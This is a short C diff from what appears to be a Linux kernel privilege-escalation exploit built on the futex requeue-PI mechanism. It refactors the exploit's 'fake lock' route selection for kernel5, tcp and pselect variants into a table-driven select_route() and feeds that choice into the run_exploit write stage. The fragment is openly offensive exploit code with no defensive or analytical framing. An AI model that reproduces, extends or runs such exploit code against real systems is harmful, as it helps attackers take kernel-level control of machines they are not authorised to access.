@@ -239,12 +239,12 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
-  if (kernel5_route_selected()) {
-    do_kernel5_fake_lock_route();
-  } else if (tcp_route_selected()) {
-    do_tcp_fake_lock_route();
+  const struct route *route = select_route();
+  if (route) {
+    pr_success("route=%s\n", route->name);
+    route->fn();
   } else {
-    do_pselect_fake_lock_route();
+    pr_error("no feasible route for this profile\n");
   }
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
@@ -1222,7 +1222,8 @@ int run_exploit(int argc, char **argv) {
       break;
     }
 
-    int exact_write = kernel5_route_selected() || tcp_route_selected();
+    const struct route *route = select_route();
+    int exact_write = route && route->exact_write;
     struct w3_stage_context w3_context = {
       .pipes = &pipes,
       .leaf_to_target8 = 0,
